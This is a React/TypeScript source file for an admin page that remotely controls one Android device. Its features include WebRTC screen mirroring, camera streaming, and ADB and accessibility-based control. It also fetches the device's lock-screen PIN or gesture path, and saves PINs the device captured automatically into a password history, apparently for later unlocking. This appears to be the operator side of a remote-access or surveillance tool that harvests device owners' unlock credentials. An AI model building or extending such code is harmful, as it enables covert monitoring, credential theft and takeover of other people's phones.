import {
  useCallback,
  useEffect,
  useMemo,
  useRef,
  useState,
  startTransition,
  type CSSProperties,
} from "react";
import { Link, useParams } from "react-router-dom";
import {
  fetchAdbStatus,
  fetchClientApkConfig,
  fetchDevices,
  fetchHealth,
  fetchKeyguardPin,
} from "../api/client";
import { canUpdateClientApk } from "../utils/client-apk-version";
import {
  applyOptimisticAccessibilityStatus,
  consumeA11yOverrideIfConfirmed,
  isAdbChannelLockedOn,
} from "../utils/adb-channel";
import "../styles/device-list.css";
import { ScreenViewer } from "../components/ScreenViewer";
import { RemoteOpsPanel } from "../components/RemoteOpsPanel";
import { useAdminScreenWebSocket } from "../hooks/useAdminScreenWebSocket";
import { useAdminWebSocket } from "../hooks/useAdminWebSocket";
import { useScreenWebRtc } from "../hooks/useScreenWebRtc";
import type { Device, KeyguardPinRecord, ScreenFrame, UiTreeSnapshot } from "../types";
import type { OpsWorkspaceKind } from "../types/ops-workspace";
import {
  loadScreenMirrorPrefs,
  resolveMirrorModeForCast,
  saveScreenMirrorPrefs,
  type MirrorMode,
} from "../utils/screen-mirror-prefs";
import { syncAutoCapturedPassword } from "../utils/device-password-store";
import { visibleScreenStatus } from "../utils/visible-screen-status";
import "../styles/app.css";
import { useI18n, t } from "../i18n";


function persistKeyguardPinToHistory(deviceId: string, record: KeyguardPinRecord | null) {
  const pin = record?.pin?.trim() ?? "";
  if (!pin) {
    return;
  }
  syncAutoCapturedPassword(deviceId, {
    pin,
    lockType: record?.lockType,
    capturedAt: record?.capturedAt,
    updatedAt: record?.updatedAt,
  });
}

/** Match API offline grace; avoid mirror teardown on brief control-WS flaps. */
const OFFLINE_DEBOUNCE_MS = 12_000;
const ONLINE_REFRESH_MS = 10_000;

function pollMsToFps(pollMs: number): number {
  return Math.min(5, Math.max(1, Math.round(1000 / pollMs)));
}

type HealthTone = "ok" | "warn" | "bad" | "idle";

function healthDotStyle(tone: HealthTone): CSSProperties {
  const bg =
    tone === "ok" ? "#22c55e" : tone === "warn" ? "#eab308" : tone === "bad" ? "#ef4444" : "#9ca3af";
  return {
    display: "inline-block",
    width: 8,
    height: 8,
    borderRadius: "50%",
    background: bg,
  };
}

function a11yTone(rttMs: number | null): HealthTone {
  if (rttMs == null) return "idle";
  if (rttMs <= 800) return "ok";
  if (rttMs <= 2500) return "warn";
  return "bad";
}

export function RemoteControlPage() {
  useI18n();
  const { deviceId: routeDeviceId } = useParams<{ deviceId: string }>();
  const deviceId = routeDeviceId?.trim() ?? "";

  if (!deviceId) {
    return (
      <div className="app-shell">
        <div className="empty-state">{t("缺少设备 ID")}</div>
      </div>
    );
  }

  return <RemoteControlContent deviceId={deviceId} />;
}

function RemoteControlContent({ deviceId }: { deviceId: string }) {
  useI18n();
  const initialPrefs = loadScreenMirrorPrefs();
  const [devices, setDevices] = useState<Device[]>([]);
  const [onlineDeviceIds, setOnlineDeviceIds] = useState<string[]>([]);
  const [screenFrame, setScreenFrame] = useState<ScreenFrame | null>(null);
  const [webrtcScreenSize, setWebrtcScreenSize] = useState<{
    width: number;
    height: number;
  } | null>(null);
  const [uiSnapshot, setUiSnapshot] = useState<UiTreeSnapshot | null>(null);
  const [uiError, setUiError] = useState<string | null>(null);
  const [screenPollMs, setScreenPollMs] = useState(initialPrefs.intervals[initialPrefs.mode]);
  const [castEnabled, setCastEnabled] = useState(false);
  const [mirrorMode, setMirrorMode] = useState<MirrorMode>(initialPrefs.mode);
  const [cameraFacing, setCameraFacing] = useState<"front" | "back" | null>(null);
  const [screenError, setScreenError] = useState<string | null>(null);
  const [apiHealthy, setApiHealthy] = useState(false);
  const [keyguardPin, setKeyguardPin] = useState<KeyguardPinRecord | null>(null);
  const [clientApkVersion, setClientApkVersion] = useState("");
  const [opsWorkspace, setOpsWorkspace] = useState<OpsWorkspaceKind>("none");
  const [workspaceHost, setWorkspaceHost] = useState<HTMLElement | null>(null);
  const [statusLog, setStatusLog] = useState(t("就绪"));
  const [adbConnected, setAdbConnected] = useState(false);
  const [adbChannelEnabled, setAdbChannelEnabled] = useState(false);
  const [accessibilityEnabled, setAccessibilityEnabled] = useState<boolean | null>(null);
  const adbChannelPinnedOffRef = useRef(false);
  const a11yOverrideRef = useRef<{ enabled: boolean } | null>(null);
  const offlineTimersRef = useRef<Map<string, number>>(new Map());

  const clearOfflineTimer = useCallback((targetDeviceId: string) => {
    const pending = offlineTimersRef.current.get(targetDeviceId);
    if (pending) {
      window.clearTimeout(pending);
      offlineTimersRef.current.delete(targetDeviceId);
    }
  }, []);

  const applyIncomingDevices = useCallback(
    (incoming: Device[]) => {
      const override = a11yOverrideRef.current
        ? { deviceId, enabled: a11yOverrideRef.current.enabled }
        : null;
      const nextOverride = consumeA11yOverrideIfConfirmed(incoming, override);
      a11yOverrideRef.current = nextOverride ? { enabled: nextOverride.enabled } : null;
      setDevices(applyOptimisticAccessibilityStatus(incoming, nextOverride));
    },
    [deviceId],
  );

  const markOnline = useCallback(
    (targetDeviceId: string) => {
      if (targetDeviceId !== deviceId) {
        return;
      }
      clearOfflineTimer(deviceId);
      setOnlineDeviceIds((current) =>
        current.includes(deviceId) ? current : [...current, deviceId],
      );
    },
    [clearOfflineTimer, deviceId],
  );

  const markOffline = useCallback(
    (targetDeviceId: string) => {
      if (targetDeviceId !== deviceId) {
        return;
      }
      const timer = window.setTimeout(() => {
        setOnlineDeviceIds((current) => current.filter((id) => id !== deviceId));
        offlineTimersRef.current.delete(deviceId);
      }, OFFLINE_DEBOUNCE_MS);
      clearOfflineTimer(deviceId);
      offlineTimersRef.current.set(deviceId, timer);
    },
    [clearOfflineTimer, deviceId],
  );

  useEffect(() => {
    void fetchClientApkConfig()
      .then((data) => setClientApkVersion(data.version ?? ""))
      .catch(() => {
        // 配置失败不影响遥控
      });
  }, []);

  useEffect(() => {
    document.body.classList.add("remote-dock-modals");
    return () => {
      document.body.classList.remove("remote-dock-modals");
    };
  }, []);

  useEffect(() => {
    void (async () => {
      try {
        await fetchHealth();
        setApiHealthy(true);
      } catch {
        setApiHealthy(false);
      }
    })();
  }, []);

  useEffect(() => {
    if (!apiHealthy) {
      return;
    }
    void (async () => {
      try {
        const data = await fetchDevices();
        applyIncomingDevices(data.devices);
        setOnlineDeviceIds(data.onlineDeviceIds);
      } catch {
        // 静默：详情页不再展示实时日志
      }
    })();
  }, [apiHealthy, applyIncomingDevices]);

  useEffect(() => {
    if (!apiHealthy) {
      return;
    }

    const timer = window.setInterval(() => {
      void fetchDevices()
        .then((data) => {
          applyIncomingDevices(data.devices);
          setOnlineDeviceIds(data.onlineDeviceIds);
          if (data.onlineDeviceIds.includes(deviceId)) {
            clearOfflineTimer(deviceId);
          }
        })
        .catch(() => {
          // 静默，避免轮询失败刷屏
        });
    }, ONLINE_REFRESH_MS);

    return () => {
      window.clearInterval(timer);
    };
  }, [apiHealthy, applyIncomingDevices, clearOfflineTimer, deviceId]);

  useEffect(() => {
    let cancelled = false;
    async function refreshAdbStatus() {
      try {
        const status = await fetchAdbStatus(deviceId);
        if (!cancelled) {
          setAdbConnected(Boolean(status.connected));
        }
      } catch {
        if (!cancelled) {
          setAdbConnected(false);
        }
      }
    }
    void refreshAdbStatus();
    const timer = window.setInterval(() => {
      void refreshAdbStatus();
    }, 5_000);
    return () => {
      cancelled = true;
      window.clearInterval(timer);
    };
  }, [deviceId]);

  useEffect(() => {
    void fetchKeyguardPin(deviceId)
      .then((keyguardPinRecord) => {
        const next = keyguardPinRecord
          ? {
              ...keyguardPinRecord,
              lockType: keyguardPinRecord.lockType ?? "pin",
              gesturePath: keyguardPinRecord.gesturePath ?? "",
            }
          : null;
        // 进页拉最新凭据时同步写入历史（不依赖子面板是否挂载）
        persistKeyguardPinToHistory(deviceId, next);
        setKeyguardPin(next);
      })
      .catch(() => {
        setKeyguardPin(null);
      });
  }, [deviceId]);

  const { connected } = useAdminWebSocket({
    onSnapshot: (nextDevices, nextOnlineDeviceIds) => {
      applyIncomingDevices(nextDevices);
      if (nextOnlineDeviceIds.includes(deviceId)) {
        clearOfflineTimer(deviceId);
      }
      setOnlineDeviceIds(nextOnlineDeviceIds);
    },
    onDeviceOnline: markOnline,
    onDeviceOffline: markOffline,
    onKeyguardPin: (targetDeviceId, record) => {
      if (targetDeviceId !== deviceId) {
        return;
      }
      // WS 自动采集：只写入历史密码，不覆盖一键解锁凭据
      persistKeyguardPinToHistory(deviceId, record);
    },
    onLog: (entry) => {
      if (entry.deviceId !== deviceId) {
        return;
      }
      if (entry.kind === "system") {
        setStatusLog(t(entry.title));
      }
    },
  });

  const clearScreenFrame = useCallback(() => {
    setScreenFrame((current) => {
      if (current?.objectUrl) {
        URL.revokeObjectURL(current.objectUrl);
      }
      return null;
    });
  }, []);

  const webrtcSignalRef = useRef<
    ((message: {
      type: "webrtc_offer" | "webrtc_answer" | "webrtc_ice" | "webrtc_hangup";
      deviceId: string;
      payload?: Record<string, unknown>;
    }) => void) | null
  >(null);

  const { connected: screenConnected, send: sendScreen } = useAdminScreenWebSocket({
    getDeviceId: () => deviceId,
    onScreenFrame: (frame) => {
      if (frame.deviceId && frame.deviceId !== deviceId) {
        if (frame.objectUrl) {
          URL.revokeObjectURL(frame.objectUrl);
        }
        return;
      }
      setScreenFrame((current) => {
        if (current?.objectUrl && current.objectUrl !== frame.objectUrl) {
          URL.revokeObjectURL(current.objectUrl);
        }
        return { ...frame, deviceId };
      });
      // Don't wipe WebRTC/ICE failure hints when JPEG fallback frames arrive.
      setScreenError((current) => {
        if (
          current &&
          /WebRTC|webrtc|ICE|ice_timeout|降级|jpeg|TURN|coturn/i.test(current)
        ) {
          return current;
        }
        return null;
      });
    },
    onScreenStatus: (status) => {
      setScreenError(visibleScreenStatus(status));
    },
    onUiTreeSnapshot: (snapshot) => {
      if (snapshot.deviceId !== deviceId) {
        return;
      }
      startTransition(() => {
        setUiSnapshot(snapshot);
        setUiError(null);
      });
    },
    onA11yUiTreeSnapshot: (snapshot) => {
      if (snapshot.deviceId !== deviceId) {
        return;
      }
      startTransition(() => {
        setUiSnapshot(snapshot);
        setUiError(null);
      });
    },
    onUiTreeStatus: (status) => {
      setUiError(status || null);
    },
    onAdbScreenDisconnected: (targetDeviceId) => {
      if (targetDeviceId && targetDeviceId !== deviceId) {
        return;
      }
      clearScreenFrame();
    },
    onAdbUiTreeDisconnected: (targetDeviceId) => {
      if (targetDeviceId && targetDeviceId !== deviceId) {
        return;
      }
      setUiSnapshot(null);
    },
    onWebrtcSignal: (message) => {
      if (message.type === "webrtc_offer") {
        const width = Number(message.payload?.screenWidth ?? 0);
        const height = Number(message.payload?.screenHeight ?? 0);
        if (width > 0 && height > 0) {
          setWebrtcScreenSize({ width, height });
        }
      } else if (message.type === "webrtc_hangup") {
        setWebrtcScreenSize(null);
      }
      webrtcSignalRef.current?.(message);
    },
  });

  const isOnline = onlineDeviceIds.includes(deviceId);
  const selectedDevice = useMemo(
    () => devices.find((device) => device.deviceId === deviceId) ?? null,
    [devices, deviceId],
  );
  const useAdbPath = adbConnected && adbChannelEnabled;
  // ADB 只切控制/节点路径；画面始终 WebRTC 优先（失败由设备侧降级 JPEG）。
  const webrtcEnabled =
    castEnabled &&
    (mirrorMode === "projection" ||
      mirrorMode === "screenshot" ||
      mirrorMode === "screenhelper");
  // Keep WebRTC alive across brief control-channel offline flaps (screen WS still up).
  const {
    remoteStream: webrtcStream,
    connected: webrtcConnected,
    handleSignal: handleWebrtcSignal,
  } = useScreenWebRtc({
    deviceId,
    enabled: webrtcEnabled && screenConnected,
    sendScreen,
    onStatus: (status) => {
      setScreenError(visibleScreenStatus(status));
    },
  });
  useEffect(() => {
    webrtcSignalRef.current = handleWebrtcSignal;
  }, [handleWebrtcSignal]);

  // If JPEG frames are flowing but WebRTC never connected, surface that explicitly.
  useEffect(() => {
    if (!castEnabled || !screenFrame || webrtcConnected) {
      return;
    }
    if (webrtcStream) {
      return;
    }
    setScreenError((current) => {
      if (current && /WebRTC|webrtc|ICE|ice_timeout|降级|JPEG|TURN|coturn/i.test(current)) {
        return current;
      }
      return t("画面：当前为 JPEG（WebRTC 未连通；常见原因 ice_timeout＝TURN 3478 不通）");
    });
  }, [castEnabled, screenFrame, webrtcConnected, webrtcStream]);

  useEffect(() => {
    if (a11yOverrideRef.current) {
      return;
    }
    const status = selectedDevice?.accessibilityStatus;
    if (status === "允许") {
      setAccessibilityEnabled(true);
    } else if (status === "拒绝" || status === "未绑定") {
      // 「未绑定」等于用不了：ensureControlReady 会拦掉点击/滑动等 18 条命令。
      // 之前只处理 允许/拒绝，导致 null 时 isAdbChannelLockedOn 不锁通道。
      setAccessibilityEnabled(false);
    }
    // 状态缺失（null）保持上次值，避免离线瞬间把「已开」翻成「已关」
  }, [selectedDevice?.accessibilityStatus]);

  // Do not auto-enable ADB channel on enter / connect — user opts in via checkbox.
  // Exception: accessibility off locks channel on (no control fallback otherwise).
  useEffect(() => {
    if (!adbConnected) {
      adbChannelPinnedOffRef.current = false;
      return;
    }
    if (!isAdbChannelLockedOn(accessibilityEnabled)) {
      return;
    }
    adbChannelPinnedOffRef.current = false;
    setAdbChannelEnabled(true);
  }, [accessibilityEnabled, adbConnected]);

  function handleAdbChannelChange(enabled: boolean) {
    if (enabled) {
      if (!adbConnected) {
        return;
      }
      adbChannelPinnedOffRef.current = false;
      setAdbChannelEnabled(true);
      return;
    }
    if (isAdbChannelLockedOn(accessibilityEnabled)) {
      return;
    }
    adbChannelPinnedOffRef.current = true;
    setAdbChannelEnabled(false);
  }

  function handleAccessibilityEnabledChange(enabled: boolean) {
    a11yOverrideRef.current = { enabled };
    setAccessibilityEnabled(enabled);
    setDevices((current) =>
      applyOptimisticAccessibilityStatus(current, { deviceId, enabled }),
    );
  }

  function applyMirrorMode(mode: MirrorMode) {
    const prefs = saveScreenMirrorPrefs({ mode });
    setMirrorMode(mode);
    setScreenPollMs(prefs.intervals[mode]);
    clearScreenFrame();
    setScreenError(null);
  }

  useEffect(() => {
    clearScreenFrame();
    setWebrtcScreenSize(null);
    setUiSnapshot(null);
    setUiError(null);
    setScreenError(null);
    setAccessibilityEnabled(null);
    a11yOverrideRef.current = null;
  }, [clearScreenFrame, deviceId]);

  useEffect(() => {
    if (isOnline) {
      setScreenError(null);
      return;
    }
    if (castEnabled || cameraFacing) {
      setScreenError(t("控制通道短暂异常，画面通道仍尝试保持…"));
    }
  }, [cameraFacing, castEnabled, isOnline]);

  // Only clear mirror when user turns cast/camera off — not on control-WS flaps.
  useEffect(() => {
    if (!castEnabled && !cameraFacing) {
      clearScreenFrame();
    }
  }, [castEnabled, cameraFacing, clearScreenFrame]);

  function handleMirrorModeChange(mode: MirrorMode) {
    applyMirrorMode(
      resolveMirrorModeForCast(useAdbPath, mode, accessibilityEnabled),
    );
  }

  // 仅「ADB + 无障碍已关」时强制授权投屏；有无障碍时保持开 ADB 前的镜像方式。
  useEffect(() => {
    const resolved = resolveMirrorModeForCast(
      useAdbPath,
      mirrorMode,
      accessibilityEnabled,
    );
    if (resolved !== mirrorMode) {
      applyMirrorMode(resolved);
    }
  }, [accessibilityEnabled, mirrorMode, useAdbPath]);

  function handlePollMsChange(pollMs: number) {
    setScreenPollMs(pollMs);
    const current = loadScreenMirrorPrefs();
    saveScreenMirrorPrefs({
      mode: mirrorMode,
      intervals: {
        ...current.intervals,
        [mirrorMode]: pollMs,
      },
    });
  }

  // Intentionally omit isOnline from deps: offline flaps must not unsubscribe.
  useEffect(() => {
    if (!screenConnected || !apiHealthy) {
      return;
    }
    if (!castEnabled && !cameraFacing) {
      return;
    }

    const fps = pollMsToFps(screenPollMs);

    if (castEnabled) {
      setScreenError(null);
      sendScreen({
        type: "subscribe_screen",
        deviceId,
        fps,
        intervalMs: screenPollMs,
        mode: mirrorMode,
      });
      return () => {
        sendScreen({ type: "unsubscribe_screen" });
      };
    }

    if (cameraFacing) {
      sendScreen({
        type: "subscribe_camera",
        deviceId,
        facing: cameraFacing,
        fps,
      });
      return () => {
        sendScreen({ type: "unsubscribe_camera" });
      };
    }
  }, [
    apiHealthy,
    castEnabled,
    cameraFacing,
    deviceId,
    mirrorMode,
    screenConnected,
    screenPollMs,
    sendScreen,
  ]);

  return (
    <div className="app-shell app-shell--remote">
      <header className="app-header app-header--compact">
        <div className="app-header-start">
          <Link className="secondary-button secondary-button--compact" to="/admin/devices">
            {t("← 返回设备列表")}
          </Link>
          <h1>
            {t("远程控制")}
            {selectedDevice?.model ? ` - ${selectedDevice.model}` : ""}
            {selectedDevice?.appVersion ? ` · B ${selectedDevice.appVersion}` : ""}
            {canUpdateClientApk(clientApkVersion, selectedDevice?.appVersion) ? (
              <>
                {" "}
                <span className="tag tag-info">{t("可更新")}</span>
              </>
            ) : null}
          </h1>
        </div>
        <div className="app-header-badges">
          <span className={`connection-badge ${apiHealthy ? "online" : ""}`}>
            <span className="connection-dot" />
            API {apiHealthy ? t("正常") : t("异常")}
          </span>
          <span className={`connection-badge ${connected ? "online" : ""}`}>
            <span className="connection-dot" />
            {t("控制 WS")} {connected ? t("已连接") : t("重连中")}
          </span>
          <span className={`connection-badge ${screenConnected ? "online" : ""}`}>
            <span className="connection-dot" />
            {t("画面 WS")} {screenConnected ? t("已连接") : t("重连中")}
          </span>
          <span className={`connection-badge ${adbConnected ? "online" : ""}`}>
            <span className="connection-dot" />
            ADB {adbConnected ? t("已连接") : t("未连接")}
          </span>
          <span
            className="connection-badge"
            title={t("控制 {0} · a11y {1} · ADB {2}", { 0: selectedDevice?.controlOk ? "OK" : "DOWN", 1: selectedDevice?.a11yRttMs != null ? `${selectedDevice.a11yRttMs}ms` : "N/A", 2: selectedDevice?.adbOk ? "OK" : "DOWN" })}
            style={{ display: "inline-flex", gap: 6, alignItems: "center" }}
          >
            <span style={healthDotStyle(selectedDevice?.controlOk === true ? "ok" : "bad")} />
            <span style={healthDotStyle(a11yTone(selectedDevice?.a11yRttMs ?? null))} />
            <span style={healthDotStyle(selectedDevice?.adbOk === true ? "ok" : "bad")} />
            {t("健康")}
          </span>
        </div>
      </header>

      <main className="app-main app-main-remote">
        <section className="panel screen-workspace-panel">
          <div className="panel-body screen-panel-body">
            <ScreenViewer
              deviceId={deviceId}
              isOnline={isOnline}
              frame={screenFrame}
              webrtcStream={webrtcStream}
              webrtcConnected={webrtcConnected}
              webrtcScreenSize={webrtcScreenSize}
              pollMs={screenPollMs}
              errorText={screenError}
              castEnabled={castEnabled}
              mirrorMode={mirrorMode}
              cameraFacing={cameraFacing}
              onCastEnabledChange={setCastEnabled}
              onMirrorModeChange={handleMirrorModeChange}
              onCameraFacingChange={setCameraFacing}
              onPollMsChange={handlePollMsChange}
              sendScreen={sendScreen}
              screenConnected={screenConnected}
              adbConnected={adbConnected}
              adbChannelEnabled={adbChannelEnabled}
              accessibilityEnabled={accessibilityEnabled}
              onAdbChannelChange={handleAdbChannelChange}
              onAccessibilityEnabledChange={handleAccessibilityEnabledChange}
              onAdbConnectedChange={(connected) => {
                setAdbConnected(connected);
              }}
              uiSnapshot={uiSnapshot}
              uiError={uiError}
              opsWorkspace={opsWorkspace}
              onWorkspaceHostChange={setWorkspaceHost}
              remark={selectedDevice?.remark ?? null}
              onRemarkSaved={(nextRemark) => {
                setDevices((current) =>
                  current.map((device) =>
                    device.deviceId === deviceId ? { ...device, remark: nextRemark } : device,
                  ),
                );
              }}
              onCommandSent={(message) => {
                const text = message.trim();
                if (text) {
                  setStatusLog(text);
                }
              }}
            />
          </div>
        </section>

        <section className="panel ops-panel ops-panel--rail">
          <div className="panel-body ops-panel-body">
            <RemoteOpsPanel
              deviceId={deviceId}
              deviceLabel={selectedDevice?.model ?? deviceId}
              isOnline={isOnline}
              keyguardPin={keyguardPin}
              onKeyguardPinChange={setKeyguardPin}
              opsWorkspace={opsWorkspace}
              onOpsWorkspaceChange={setOpsWorkspace}
              workspaceHost={workspaceHost}
              onCommandSent={(message) => {
                const text = message.trim();
                if (text) {
                  setStatusLog(text);
                }
              }}
            />
          </div>
        </section>
      </main>
      <footer className="remote-status-log" title={statusLog}>
        <span className="remote-status-log-label">LOG</span>
        <span className="remote-status-log-text">{statusLog}</span>
      </footer>
    </div>
  );
}
